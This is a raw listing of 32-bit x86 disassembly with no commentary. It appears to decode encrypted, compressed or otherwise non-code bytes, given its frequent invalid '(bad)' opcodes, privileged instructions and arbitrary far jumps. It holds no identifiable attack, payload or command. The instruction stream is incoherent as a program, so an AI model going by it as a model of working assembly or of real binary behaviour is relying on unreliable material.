  40ab9c:	or     BYTE PTR [ebx],dh
  40ab9e:	and    eax,0x3e11b64c
  40aba3:	xchg   ebp,eax
  40aba4:	xor    edx,DWORD PTR [ebp+0xb]
  40aba7:	in     eax,0x3f
  40aba9:	jno    0x40ac0e
  40abab:	mov    cl,0xcf
  40abad:	push   edi
  40abae:	loope  0x40ab4d
  40abb0:	retf   
  40abb1:	add    dh,BYTE PTR ds:0x465bcb8d
  40abb7:	cs push eax
  40abb9:	sub    BYTE PTR [esi-0x2d],cl
  40abbc:	push   ds
  40abbd:	outs   dx,DWORD PTR ds:[esi]
  40abbe:	jp     0x40ab68
  40abc0:	(bad)  
  40abc1:	add    DWORD PTR [ebp+0x20801368],edx
  40abc7:	inc    esp
  40abc8:	and    eax,DWORD PTR [edi]
  40abca:	pop    esi
  40abcb:	push   esi
  40abcc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40abcd:	push   esi
  40abce:	aaa    
  40abcf:	inc    eax
  40abd0:	les    ebx,FWORD PTR [ecx-0x8]
  40abd3:	out    dx,al
  40abd4:	xor    ah,BYTE PTR [edx-0x12]
  40abd7:	psubq  mm1,QWORD PTR [edi-0x4a]
  40abdb:	push   esp
  40abdc:	pusha  
  40abdd:	dec    esi
  40abde:	into   
  40abdf:	(bad)  
  40abe0:	mov    ds:0xc1db2a86,al
  40abe5:	mov    WORD PTR [eax+0x21],gs
  40abe8:	lods   al,BYTE PTR ds:[esi]
  40abe9:	dec    ebp
  40abea:	mov    bh,0xaa
  40abec:	cmp    al,0x67
  40abee:	(bad)  
  40abef:	jp     0x40abe5
  40abf1:	mov    bl,0xa0
  40abf3:	nop
  40abf4:	test   eax,0x908d0758
  40abfa:	mov    cs,WORD PTR [ebp+0x753db82b]
  40ac00:	(bad)  
  40ac01:	jl     0x40ac12
  40ac03:	test   eax,0xa64db659
  40ac08:	mul    BYTE PTR [edi]
  40ac0a:	popaw  
  40ac0c:	(bad)  
  40ac0d:	not    DWORD PTR [ecx+ebp*2-0x3c]
  40ac11:	les    ebp,FWORD PTR [esi+0x6647974d]
  40ac17:	jecxz  0x40abd1
  40ac19:	out    dx,eax
  40ac1a:	cmp    DWORD PTR [ebx-0x3f55f08b],ebx
  40ac20:	dec    esp
  40ac21:	inc    eax
  40ac22:	sbb    esi,0x93bf2500
  40ac28:	loope  0x40ac3f
  40ac2a:	mov    edi,ebx
  40ac2c:	dec    eax
  40ac2d:	fwait
  40ac2e:	cmp    al,0x11
  40ac30:	ins    DWORD PTR es:[edi],dx
  40ac31:	and    esp,DWORD PTR [esi+0x2884146d]
  40ac37:	sbb    eax,0x1f1e3dbb
  40ac3c:	add    BYTE PTR [edi+0x4f42ed39],0xfc
  40ac43:	mov    al,ds:0x839f2eb4
  40ac48:	sbb    eax,0x805c96ab
  40ac4d:	push   esp
  40ac4e:	pop    ss
  40ac4f:	inc    ecx
  40ac50:	jnp    0x40acb1
  40ac52:	mov    bh,BYTE PTR [ecx]
  40ac54:	sub    eax,0x9f6bd40a
  40ac59:	(bad)  
  40ac5a:	or     edx,DWORD PTR [edi]
  40ac5c:	cdq    
  40ac5d:	arpl   WORD PTR [esi-0x6da7aef8],ax
  40ac63:	sbb    eax,0x4eea33e
  40ac68:	or     al,0x4c
  40ac6a:	inc    edi
  40ac6b:	dec    DWORD PTR [edi+0x72]
  40ac6e:	sub    BYTE PTR [ebp+0x59],ch
  40ac71:	inc    edx
  40ac72:	xchg   esi,eax
  40ac73:	jge    0x40ac6f
  40ac75:	leave  
  40ac76:	aas    
  40ac77:	push   0x37
  40ac79:	addr16 or al,0x54
  40ac7c:	int    0xc6
  40ac7e:	inc    DWORD PTR [esi]
  40ac80:	outs   dx,BYTE PTR ds:[esi]
  40ac81:	cmp    al,0xc9
  40ac83:	mov    ebp,ebp
  40ac85:	pop    ss
  40ac86:	repnz fsub DWORD PTR [ecx-0x2c]
  40ac8a:	sti    
  40ac8b:	sbb    DWORD PTR [ecx-0x3c],0x19
  40ac8f:	outs   dx,BYTE PTR ds:[esi]
  40ac90:	push   es
  40ac91:	xor    BYTE PTR [esi+ebp*2],bh
  40ac94:	fimul  DWORD PTR [ebx+esi*8]
  40ac97:	cmp    eax,0x71e61c70
  40ac9c:	cmp    eax,0x1b358707
  40aca1:	addr16 inc ecx
  40aca3:	inc    DWORD PTR [eax-0x5]
  40aca6:	or     cl,0xc2
  40aca9:	mov    eax,ds:0xb853934d
  40acae:	imul   edx,DWORD PTR [eax+0x1a],0xffffffc0
  40acb2:	sub    al,cl
  40acb4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40acb5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40acb6:	std    
  40acb7:	ret    
  40acb8:	mov    al,0x31
  40acba:	stos   BYTE PTR es:[edi],al
  40acbb:	pop    es
  40acbc:	scas   eax,DWORD PTR es:[edi]
  40acbd:	cmp    DWORD PTR [eax+0x43],edi
  40acc0:	pop    esp
  40acc1:	adc    edx,DWORD PTR [ebp+0x3721ae45]
  40acc7:	xor    DWORD PTR [eax+0xe],edx
  40acca:	js     0x40acfd
  40accc:	repnz or ebx,DWORD PTR [esp+eiz*2-0x125c8d82]
  40acd4:	lahf   
  40acd5:	outs   dx,BYTE PTR ds:[si]
  40acd7:	hlt    
  40acd8:	ins    BYTE PTR es:[edi],dx
  40acd9:	mov    ebx,0x580a3e95
  40acde:	loope  0x40ac8a
  40ace0:	sub    ebx,DWORD PTR [edi+edx*8]
  40ace3:	ror    bl,0x72
  40ace6:	adc    ebx,0x481eb906
  40acec:	jno    0x40ad47
  40acee:	daa    
  40acef:	retf   
  40acf0:	mov    dl,0x36
  40acf2:	inc    BYTE PTR [eax-0x5505c730]
  40acf8:	clc    
  40acf9:	mov    cl,0xc5
  40acfb:	shl    BYTE PTR [ebx+eiz*8-0x49],cl
  40acff:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ad00:	mov    al,0xe1
  40ad02:	sub    bh,BYTE PTR [eax-0x381c7eba]
  40ad08:	enter  0x4d3f,0x2
  40ad0c:	adc    al,0xd9
  40ad0e:	jo     0x40acee
  40ad10:	xchg   edi,eax
  40ad11:	jne    0x40ad35
  40ad13:	inc    esp
  40ad14:	inc    ebp
  40ad15:	add    ch,BYTE PTR [edi-0x34]
  40ad18:	jne    0x40acb4
  40ad1a:	adc    al,0xbf
  40ad1c:	repz in al,dx
  40ad1e:	xchg   ebx,eax
  40ad1f:	mov    BYTE PTR [eax],bl
  40ad21:	push   0x86427a55
  40ad26:	jg     0x40acd6
  40ad28:	int    0xbb
  40ad2a:	leave  
  40ad2b:	addr16 push esp
  40ad2d:	scas   eax,DWORD PTR es:[edi]
  40ad2e:	iret   
  40ad2f:	je     0x40ad5e
  40ad31:	loopne 0x40acde
  40ad33:	arpl   WORD PTR [esi+0x7a],cx
  40ad36:	sub    WORD PTR [edx],sp
  40ad39:	pop    ecx
  40ad3a:	pop    esp
  40ad3b:	test   DWORD PTR [ebx+0x13cc0fa0],ebx
  40ad41:	and    eax,0x8b2b1667
  40ad46:	mov    bh,0xd8
  40ad48:	pop    es
  40ad49:	jle    0x40adb5
  40ad4b:	xor    edi,DWORD PTR [edi-0x7053498]
  40ad51:	jae    0x40ad05
  40ad53:	adc    eax,0xba9c4d2d
  40ad58:	dec    edi
  40ad59:	test   DWORD PTR [eax],edi
  40ad5b:	pop    edi
  40ad5c:	jns    0x40add8
  40ad5e:	inc    esi
  40ad5f:	mov    bl,0x20
  40ad61:	mov    edi,0xf3de3962
  40ad66:	jbe    0x40adc9
  40ad68:	lahf   
  40ad69:	xchg   ecx,eax
  40ad6a:	cwde   
  40ad6b:	jns    0x40ad4c
  40ad6d:	pop    ebp
  40ad6e:	out    dx,al
  40ad6f:	jmp    0x88d2:0x3d87820e
  40ad76:	sub    BYTE PTR [edx-0x2e0a7cc1],0x35
  40ad7d:	mov    ebp,0x581593a2
  40ad82:	cmp    DWORD PTR ds:0x82418556,esp
  40ad88:	retf   0xf73c
  40ad8b:	rol    BYTE PTR [edx-0x5e],cl
  40ad8e:	sub    eax,0xabc1b5d5
  40ad93:	sbb    bh,BYTE PTR [ecx]
  40ad95:	push   edi
  40ad96:	aam    0x8
  40ad98:	cld    
  40ad99:	adc    DWORD PTR [ebp-0x69673dcf],esp
  40ad9f:	sar    DWORD PTR [eax+0x56],1
  40ada2:	cdq    
  40ada3:	ror    DWORD PTR [eax+0xa],cl
  40ada6:	pop    ebp
  40ada7:	dec    edi
  40ada8:	test   al,0xdc
  40adaa:	(bad)  
  40adab:	aad    0xf1
  40adad:	ss stos BYTE PTR es:[edi],al
  40adaf:	shl    DWORD PTR [esi+0x56cc2c18],1
  40adb5:	clc    
  40adb6:	sub    BYTE PTR [ecx],dh
  40adb8:	ds jl  0x40ad43
  40adbb:	inc    ecx
  40adbc:	es adc ebp,0x63
  40adc0:	push   esi
  40adc1:	pop    es
  40adc2:	xor    eax,0x8973fce0
  40adc7:	into   
  40adc8:	imul   esp,DWORD PTR [edi],0xffffffc4
  40adcb:	adc    BYTE PTR [eax-0x38],bh
  40adce:	popf   
  40adcf:	out    dx,al
  40add0:	jge    0x40ad8d
  40add2:	sar    BYTE PTR ss:[edx-0x5a],0x55
  40add7:	je     0x40ae29
  40add9:	(bad)  
  40adda:	mov    bh,0xef
  40addc:	leave  
  40addd:	sbb    eax,0x7a148a2b
  40ade2:	shr    eax,0x35
  40ade5:	ret    
  40ade6:	mov    edi,0x109c5860
  40adeb:	(bad)  [esi]
  40aded:	dec    esp
  40adee:	push   es
  40adef:	mov    ah,0x5c
  40adf1:	cld    
  40adf2:	retf   0xfd19
  40adf5:	pop    ebp
  40adf6:	repz xchg esp,eax
  40adf8:	inc    ebp
  40adf9:	test   DWORD PTR [ecx+0x62ff897a],edi
  40adff:	imul   ebx,DWORD PTR [edi+0x11cfc28b],0xa0c192a1
  40ae09:	and    DWORD PTR [esi],0x4e
  40ae0c:	popf   
  40ae0d:	inc    eax
  40ae0e:	js     0x40adab
  40ae10:	fisubr DWORD PTR [esi]
  40ae12:	sub    DWORD PTR [edx+eax*1+0x52820178],esp
  40ae19:	leave  
  40ae1a:	inc    edi
  40ae1b:	mov    cl,0xc3
  40ae1d:	fist   WORD PTR [ecx]
  40ae1f:	add    eax,0x34d6b75a
  40ae24:	loope  0x40ae34
  40ae26:	sbb    DWORD PTR [ebx],edi
  40ae28:	mov    edi,0x436ac989
  40ae2d:	pop    ss
  40ae2e:	outs   dx,BYTE PTR ds:[esi]
  40ae2f:	mov    esp,0x478193cd
  40ae34:	inc    ecx
  40ae35:	imul   edx,DWORD PTR [edx-0x68da0bbf],0x4f3d2606
  40ae3f:	push   esp
  40ae40:	test   al,0xc6
  40ae42:	into   
  40ae43:	lods   al,BYTE PTR ds:[esi]
  40ae44:	mov    edi,0x9c736d19
  40ae49:	lahf   
  40ae4a:	lods   eax,DWORD PTR ds:[esi]
  40ae4b:	test   eax,0x6c77d872
  40ae50:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ae51:	sti    
  40ae52:	daa    
  40ae53:	inc    eax
  40ae54:	add    eax,DWORD PTR [esi-0x43]
  40ae57:	mov    ebp,0x764ceb3d
  40ae5c:	or     dh,dh
  40ae5e:	dec    ebp
  40ae5f:	add    cl,BYTE PTR [esi-0x658b1537]
  40ae65:	sub    BYTE PTR [esi+eiz*4],dh
  40ae68:	cmp    al,0x52
  40ae6a:	jmp    0x40aeb8
  40ae6c:	arpl   WORD PTR [esi+0x7b245dc],di
  40ae72:	and    eax,0x211f97c4
  40ae77:	test   al,0x1f
  40ae79:	jae    0x40aee5
  40ae7b:	cmp    DWORD PTR [ebp-0x7a],esp
  40ae7e:	mov    eax,ds:0x9b19766
  40ae83:	imul   esi,DWORD PTR [eax+eax*4],0x4f14b638
  40ae8a:	retf   0x36a1
  40ae8d:	repz jge 0x40ae8c
  40ae90:	loopne 0x40aece
  40ae92:	sar    BYTE PTR [ebp-0x6f],1
  40ae95:	repnz pop es
  40ae97:	mov    edx,0x7c8755c0
  40ae9c:	cmp    al,0x95
  40ae9e:	inc    ebx
  40ae9f:	mov    ds:0x1c3a876f,al
  40aea4:	ja     0x40aebb
  40aea6:	add    al,0x2b
  40aea8:	dec    esi
  40aea9:	adc    BYTE PTR [ecx-0x49f20357],dh
  40aeaf:	and    DWORD PTR [ecx+0x2c33468],esp
  40aeb5:	jne    0x40aed7
  40aeb7:	mov    bl,BYTE PTR [esi-0x65]
  40aeba:	xchg   edi,eax
  40aebb:	and    ah,al
  40aebd:	xchg   edx,eax
  40aebe:	sti    
  40aebf:	pop    es
  40aec0:	(bad)  
  40aec1:	adc    esp,DWORD PTR ds:0x7fbe68cc
  40aec7:	add    eax,0x374e709a
  40aecc:	clc    
  40aecd:	ds fwait
  40aecf:	mov    al,ds:0x62510290
  40aed4:	push   es
  40aed5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40aed6:	inc    ebx
  40aed7:	popf   
  40aed8:	mov    eax,0xed62a212
  40aedd:	inc    edi
  40aede:	ja     0x40af47
  40aee0:	jb     0x40aee3
  40aee2:	outs   dx,BYTE PTR ds:[esi]
  40aee3:	mov    ch,0xd5
  40aee5:	adc    edi,DWORD PTR [ebx+0x7b331c34]
  40aeeb:	push   cs
  40aeec:	push   esi
  40aeed:	jb     0x40af41
  40aeef:	aaa    
  40aef0:	fdiv   DWORD PTR [edi+0x3546bf1f]
  40aef6:	xor    esi,DWORD PTR [ebp+0x3cda19da]
  40aefc:	fisttp WORD PTR [edx-0x835ec44]
  40af02:	nop
  40af03:	cmc    
  40af04:	xchg   edx,eax
  40af05:	push   esi
  40af06:	ss xchg ecx,eax
  40af08:	retf   0xad2a
  40af0b:	lahf   
  40af0c:	mov    al,0x60
  40af0e:	hlt    
  40af0f:	dec    eax
  40af10:	dec    eax
  40af11:	retf   0xc6c0
  40af14:	aaa    
  40af15:	arpl   WORD PTR ds:0xceb4579c,ax
  40af1b:	fist   WORD PTR [edx-0x6a]
  40af1e:	aad    0x4b
  40af20:	cli    
  40af21:	push   eax
  40af22:	cwde   
  40af23:	test   eax,0xf6e8183e
  40af28:	xor    DWORD PTR [edi],0x40
  40af2b:	xchg   DWORD PTR [ebx],eax
  40af2d:	jns    0x40af29
  40af2f:	enter  0xba33,0x1a
  40af33:	mov    al,0xa2
  40af35:	jle    0x40af47
  40af37:	dec    ecx
  40af38:	(bad)  
  40af39:	aad    0xeb
  40af3b:	inc    esi
  40af3c:	retf   
  40af3d:	and    ebp,esp
  40af3f:	xor    edi,DWORD PTR [edx-0x32]
  40af42:	and    al,0xa2
  40af44:	lods   al,BYTE PTR ds:[esi]
  40af45:	sub    eax,0xd61aa72c
  40af4a:	ret    
  40af4b:	(bad)  
  40af4c:	in     eax,dx
  40af4d:	jmp    0x51e6:0x36eaa6fd
  40af54:	push   0xffffffba
  40af56:	fs enter 0x7332,0xc3
  40af5b:	sub    bl,dl
  40af5d:	dec    edx
  40af5e:	inc    edx
  40af5f:	push   edx
  40af60:	(bad)  
  40af61:	xlat   BYTE PTR ds:[ebx]
  40af62:	popa   
  40af63:	jne    0x40af3b
  40af65:	imul   edi,DWORD PTR [edi],0xffffff9d
  40af68:	push   esi
  40af69:	mov    ah,0xe1
  40af6b:	xor    BYTE PTR [edi+0x5],cl
  40af6e:	dec    ebx
  40af6f:	jbe    0x40af16
  40af71:	mov    edi,0xb731e55b
  40af76:	mov    eax,0xc6405d55
  40af7b:	pop    eax
  40af7c:	jge    0x40afaa
  40af7e:	in     al,0x78
  40af80:	enter  0xa767,0xd5
  40af84:	stos   BYTE PTR es:[edi],al
  40af85:	cdq    
  40af86:	dec    esp
  40af87:	pop    es
  40af88:	sti    
  40af89:	inc    ecx
  40af8a:	jne    0x40af14
  40af8c:	cmp    BYTE PTR [eax+eiz*4+0x67],bh
  40af90:	test   al,0x46
  40af92:	dec    ebx
  40af93:	test   DWORD PTR [ecx+ebx*4],edi
  40af96:	xor    edi,DWORD PTR [esi]
  40af98:	xor    eax,0xe33b6737
  40af9d:	mov    ecx,0xb81eb9bb
  40afa2:	sar    DWORD PTR [ebx],cl
  40afa4:	jae    0x40af84
  40afa6:	adc    edx,DWORD PTR [edx-0x3239ec48]
  40afac:	arpl   WORD PTR [ebx],bx
  40afae:	xchg   ch,cl
  40afb0:	lds    esp,FWORD PTR [ebx+0x37]
  40afb3:	ss mov edx,cs
  40afb6:	pop    esi
  40afb7:	sbb    al,0x47
  40afb9:	inc    eax
  40afba:	ret    
  40afbb:	sub    dl,BYTE PTR [edi+ebp*1+0xe]
  40afbf:	cmc    
  40afc0:	mov    eax,0xad2e11d0
  40afc5:	mov    cl,0x2
  40afc7:	rcl    DWORD PTR [ebp+0x56],0x96
  40afcb:	mov    ds:0x4a96e054,al
  40afd0:	xchg   edi,eax
  40afd1:	(bad)  
  40afd2:	dec    esp
  40afd3:	cmp    ebx,DWORD PTR [esi+0x24722a06]
  40afd9:	dec    eax
  40afda:	fs and esi,ebx
  40afdd:	pop    edx
  40afde:	inc    edx
  40afdf:	out    dx,al
  40afe0:	bound  esp,QWORD PTR [ebx]
  40afe2:	or     eax,0xf7434177
  40afe7:	push   cs
  40afe8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40afe9:	fisub  DWORD PTR [esi]
  40afeb:	pop    ds
  40afec:	or     eax,0x216711d6
  40aff1:	scas   al,BYTE PTR es:[edi]
  40aff2:	jg     0x40afd3
  40aff4:	pop    esp
  40aff5:	mov    ecx,0xa40b2f70
  40affa:	and    bh,0xf1
  40affd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40affe:	push   ss
  40afff:	jb     0x40aff4
  40b001:	(bad)  
  40b002:	jl     0x40b046
  40b004:	sbb    BYTE PTR [edi+0x63],0x13
  40b008:	xchg   ebp,eax
  40b009:	inc    edx
  40b00a:	lock call 0xd19a:0xa56da0ef
  40b012:	jecxz  0x40afbd
  40b014:	test   edi,0xf59292bb
  40b01a:	sbb    BYTE PTR [ebp-0x7f5ec65b],ah
  40b020:	mov    dh,0xe
  40b022:	pop    esi
  40b023:	and    DWORD PTR [esi],eax
  40b025:	sbb    DWORD PTR [esi-0x79],eax
  40b028:	fcmovb st,st(0)
  40b02a:	dec    edi
  40b02b:	pushf  
  40b02c:	or     eax,0x5b060b13
  40b031:	jmp    0xfdaed225
  40b036:	std    
  40b037:	mov    eax,0x229af0a2
  40b03c:	rol    BYTE PTR [edi+edi*8-0x5b9d0b4e],1
  40b043:	dec    sp
  40b045:	jmp    0x7605:0x5ef3bb2f
  40b04c:	mov    ebp,DWORD PTR [esi]
  40b04e:	inc    ebp
  40b04f:	jle    0x40afe1
  40b051:	(bad)  
  40b053:	dec    eax
  40b054:	add    edi,DWORD PTR ss:[ecx]
  40b057:	sti    
  40b058:	test   eax,0xc9f0990c
  40b05d:	inc    edx
  40b05e:	pusha  
  40b05f:	je     0x40b0cb
  40b061:	retf   
  40b062:	ror    BYTE PTR ds:0x9e274e32,1
  40b068:	xor    BYTE PTR [si+0x4740],al
  40b06d:	mov    gs,WORD PTR [edi-0x24cba83]
  40b073:	lods   al,BYTE PTR ds:[esi]
  40b074:	(bad)  
  40b075:	dec    edx
  40b076:	repz add ch,BYTE PTR [eax-0x24]
  40b07a:	inc    eax
  40b07b:	dec    esi
  40b07c:	jmp    0x40b01a
  40b07e:	nop
  40b07f:	scas   al,BYTE PTR es:[edi]
  40b080:	je     0x40b06a
  40b082:	out    dx,al
  40b083:	fwait
  40b084:	(bad)  
  40b085:	push   ds
  40b086:	xchg   ebx,eax
  40b087:	and    DWORD PTR [edx-0x5e59f030],ecx
  40b08d:	and    al,ah
  40b08f:	icebp  
  40b090:	jae    0x40b0ad
  40b092:	xchg   ebx,eax
  40b093:	add    eax,0xa5ad225e
  40b098:	je     0x40b060
  40b09a:	mov    eax,0x5d300de1
  40b09f:	dec    edx
  40b0a0:	sbb    al,0x9a
  40b0a2:	js     0x40b0dd
  40b0a4:	mov    esp,0x11bef53
  40b0a9:	xchg   ebx,eax
  40b0aa:	jg     0x40b0f8
  40b0ac:	icebp  
  40b0ad:	dec    edx
  40b0ae:	xchg   edi,eax
  40b0af:	pushf  
  40b0b0:	pop    ebx
  40b0b1:	push   edi
  40b0b2:	xor    DWORD PTR [ecx],edx
  40b0b4:	add    cl,BYTE PTR [eax+0x1c]
  40b0b7:	xor    al,BYTE PTR [edi]
  40b0b9:	mov    BYTE PTR [edi-0x6bcb9453],ah
  40b0bf:	jge    0x40b0f2
  40b0c1:	mov    dh,0x67
  40b0c3:	push   esi
  40b0c4:	mov    ds:0x328efd76,al
  40b0c9:	rcr    BYTE PTR [ebp+esi*2+0x1edf9ef],cl
  40b0d0:	bswap  ebp
  40b0d2:	inc    esi
  40b0d3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b0d4:	call   0x1357:0x5181dfe5
  40b0db:	mov    cs,WORD PTR [esi+0x7db123e1]
  40b0e1:	popa   
  40b0e2:	pop    ds
  40b0e3:	push   edx
  40b0e4:	cdq    
  40b0e5:	add    al,0x37
  40b0e7:	adc    eax,0x2f8de9c4
  40b0ec:	sub    DWORD PTR [eax+0x13],eax
  40b0ef:	jne    0x40b16d
  40b0f1:	lock hlt 
  40b0f3:	int    0xa6
  40b0f5:	test   esp,edi
  40b0f7:	ror    DWORD PTR [ecx+0x17],1
  40b0fa:	in     eax,0xaf
  40b0fc:	mov    esp,0xfc65dca0
  40b101:	push   ebx
  40b102:	loopne 0x40b105
  40b104:	sub    eax,0x51157292
  40b109:	imul   ecx,DWORD PTR [eax],0x9680b4e3
  40b10f:	mov    WORD PTR [ecx],fs
  40b111:	xor    ah,BYTE PTR [esp+edx*8]
  40b114:	xor    BYTE PTR [ebp-0x5948ba80],bl
  40b11a:	inc    edi
  40b11b:	sbb    DWORD PTR [ecx-0x23e5b4a4],edi
  40b121:	mov    ah,0x8e
  40b123:	cmp    ecx,edi
  40b125:	or     eax,0x2fa144ec
  40b12a:	dec    edx
  40b12b:	cwde   
  40b12c:	fistp  WORD PTR [ebp-0x9b67cc1]
  40b132:	stos   BYTE PTR es:[edi],al
  40b133:	arpl   bx,dx
  40b135:	scas   al,BYTE PTR es:[edi]
  40b136:	and    BYTE PTR [ebx+ebx*1+0x1e],dh
  40b13a:	int    0xd1
  40b13c:	pop    esp
  40b13d:	ins    BYTE PTR es:[edi],dx
  40b13e:	mov    bh,al
  40b140:	mov    esi,0xdb5e142d
  40b145:	xchg   edx,eax
  40b146:	lahf   
  40b147:	pop    eax
  40b148:	mov    ah,0x13
  40b14a:	push   ds
  40b14b:	mov    ah,0xe8
  40b14d:	sar    DWORD PTR [esi+ecx*1-0xa],cl
  40b151:	stos   BYTE PTR es:[edi],al
  40b152:	icebp  
  40b153:	adc    ah,BYTE PTR [edx]
  40b155:	loope  0x40b117
  40b157:	mov    ebp,0xb0b760f4
  40b15c:	fwait
  40b15d:	les    ebp,FWORD PTR [eax+0x54c79e87]
  40b163:	iret   
  40b164:	nop
  40b165:	jp     0x40b109
  40b167:	loopne 0x40b0ec
  40b169:	int    0xf9
  40b16b:	(bad)  
  40b16c:	popf   
  40b16d:	(bad)  
  40b16e:	sub    al,0xda
  40b170:	sbb    ah,BYTE PTR [edi-0x69]
  40b173:	jl     0x40b1b7
  40b175:	mov    edx,0x954210d1
  40b17a:	pop    es
  40b17b:	pushf  
  40b17c:	cwde   
  40b17d:	pop    ds
  40b17e:	and    ch,bh
  40b180:	mov    edi,0x25c8e577
  40b185:	out    dx,al
  40b186:	test   DWORD PTR [ebp-0x7b1fd95b],0xeb0dd5f4
  40b190:	hlt    
  40b191:	jecxz  0x40b155
  40b193:	repz cmp eax,0x425ecfa0
  40b199:	outs   dx,BYTE PTR ds:[esi]
  40b19a:	sbb    BYTE PTR [ebx-0xfef629b],0x2d
  40b1a1:	adc    dh,dl
  40b1a3:	arpl   WORD PTR [ebp+0x5b],sp
  40b1a6:	inc    ecx
  40b1a7:	adc    eax,0x1e29fcdb
  40b1ac:	sbb    al,0x88
  40b1ae:	pop    ebx
  40b1af:	pushf  
  40b1b0:	rol    esp,1
  40b1b2:	sbb    eax,0x78265165
  40b1b7:	outs   dx,DWORD PTR ds:[esi]
  40b1b8:	aas    
  40b1b9:	icebp  
  40b1ba:	data16 add al,dl
  40b1bd:	sbb    ebx,DWORD PTR [ebp+0x864b81]
  40b1c3:	mov    BYTE PTR [edi-0x7e],dh
  40b1c6:	fs add ah,ch
  40b1c9:	inc    ebx
  40b1ca:	outs   dx,BYTE PTR ds:[esi]
  40b1cb:	push   es
  40b1cc:	aas    
  40b1cd:	inc    ebx
  40b1ce:	push   ebp
  40b1cf:	jns    0x40b19d
  40b1d1:	inc    ecx
  40b1d2:	nop
  40b1d3:	mov    ebp,DWORD PTR [ecx-0x138112a5]
  40b1d9:	rol    BYTE PTR [ebp-0x16561d3a],cl
  40b1df:	pusha  
  40b1e0:	xchg   edx,eax
  40b1e1:	dec    esp
  40b1e2:	call   0xec3f:0x4c6014ea
  40b1e9:	add    esp,ebp
  40b1eb:	fcomi  st,st(0)
  40b1ed:	scas   eax,DWORD PTR es:[edi]
  40b1ee:	dec    esi
  40b1ef:	addps  xmm1,xmm4
  40b1f2:	cmp    ebp,DWORD PTR [ebp-0x176a266b]
  40b1f8:	sub    al,BYTE PTR [edi]
  40b1fa:	xor    BYTE PTR [ebp+0x685b5493],0x7
  40b201:	mov    ecx,0x1073493
  40b206:	je     0x40b284
  40b208:	push   ebx
  40b209:	add    DWORD PTR [esi+0x78],esi
  40b20c:	mov    ?,WORD PTR [edx-0x40]
  40b20f:	ret    
  40b210:	pop    ecx
  40b211:	(bad)
  40b214:	or     cl,BYTE PTR ds:0xec78c9ea
  40b21a:	push   edi
  40b21b:	or     ebx,ebx
  40b21d:	or     DWORD PTR [ecx],esp
  40b21f:	ret    0xe7a0
  40b222:	mov    ds:0x539b65e6,eax
  40b227:	push   ebp
  40b228:	mov    dl,0xa7
  40b22a:	jo     0x40b266
  40b22c:	mov    BYTE PTR [edx],cl
  40b22e:	adc    eax,0x2051be45
  40b233:	ror    DWORD PTR [eax+0x69],1
  40b236:	and    ecx,0x1f98f191
  40b23c:	jecxz  0x40b22e
  40b23e:	test   al,ah
  40b240:	jne    0x40b219
  40b242:	push   ebp
  40b243:	push   edx
  40b244:	xor    al,0x98
  40b246:	fnstenv [ebx+0x41]
  40b249:	adc    eax,ebx
  40b24b:	pop    ebp
  40b24c:	jne    0x40b234
  40b24e:	(bad)  
  40b24f:	repz loope 0x40b21e
  40b252:	repz into 
  40b254:	mov    esi,0x5a5df5a9
  40b259:	mov    ss,WORD PTR [ecx]
  40b25b:	sub    al,0xc6
  40b25d:	aaa    
  40b25e:	call   0x7256:0x4c94d0
  40b265:	out    dx,eax
  40b266:	xchg   ebp,eax
  40b267:	add    eax,0x93ff1434
  40b26c:	xor    edx,DWORD PTR [esi+0x58]
  40b26f:	sbb    al,BYTE PTR cs:[esi+0x16]
  40b273:	stos   BYTE PTR es:[edi],al
  40b274:	ret    
  40b275:	push   eax
  40b276:	std    
  40b277:	imul   edi,DWORD PTR ds:0x5c98bfb0,0x3f91db3a
  40b281:	pop    esi
  40b282:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b283:	xchg   ebp,eax
  40b284:	and    edi,DWORD PTR [ebx+eax*2-0x42489eb9]
  40b28b:	xchg   ecx,eax
  40b28c:	xor    ecx,DWORD PTR [edi]
  40b28e:	inc    edi
  40b28f:	cmp    ah,BYTE PTR ds:0x266789c7
  40b295:	sub    dl,BYTE PTR [esi+0x10]
  40b298:	mov    eax,ds:0xaa97f2b8
  40b29d:	jae    0x40b21f
  40b29f:	cli    
  40b2a0:	dec    ebx
  40b2a1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b2a2:	push   es
  40b2a3:	emms   
  40b2a5:	call   0xa03541ef
  40b2aa:	rcr    DWORD PTR [ebp+0x626d880a],0x91
  40b2b1:	mov    ah,0x21
  40b2b3:	jae    0x40b2ec
  40b2b5:	ins    BYTE PTR es:[edi],dx
  40b2b6:	fwait
  40b2b7:	mov    bh,0xea
  40b2b9:	in     eax,dx
  40b2ba:	cld    
  40b2bb:	sbb    ebp,esi
  40b2bd:	(bad)  
  40b2be:	imul   cx,WORD PTR [edi-0x6ed2393b],0x5c
  40b2c6:	repz (bad) 
  40b2c8:	(bad)  
  40b2c9:	hlt    
  40b2ca:	sub    dl,ah
  40b2cc:	or     esp,DWORD PTR [ecx]
  40b2ce:	into   
  40b2cf:	mov    cs,WORD PTR [edi]
  40b2d1:	sahf   
  40b2d2:	pop    ebp
  40b2d3:	pop    ebx
  40b2d4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b2d5:	out    dx,eax
  40b2d6:	mov    esi,0x4f3db161
  40b2db:	xor    al,0x72
  40b2dd:	dec    esi
  40b2de:	out    dx,al
  40b2df:	lahf   
  40b2e0:	dec    esi
  40b2e1:	add    bl,BYTE PTR [edx+esi*4+0xdb10c89]
  40b2e8:	fincstp 
  40b2ea:	fst    QWORD PTR [ebp-0x4814ddf2]
  40b2f0:	adc    esi,ecx
  40b2f2:	xor    ah,BYTE PTR [ecx+eiz*8-0x4f71108e]
  40b2f9:	mov    BYTE PTR [eax+ecx*4+0x37],bl
  40b2fd:	sbb    edx,DWORD PTR es:[esi+0x27]
  40b301:	sti    
  40b302:	mov    eax,ds:0x4d6eb82c
  40b307:	jb     0x40b33a
  40b309:	push   eax
  40b30a:	push   ebp
  40b30b:	pop    edx
  40b30c:	imul   ebp,DWORD PTR [edx],0x9577ad30
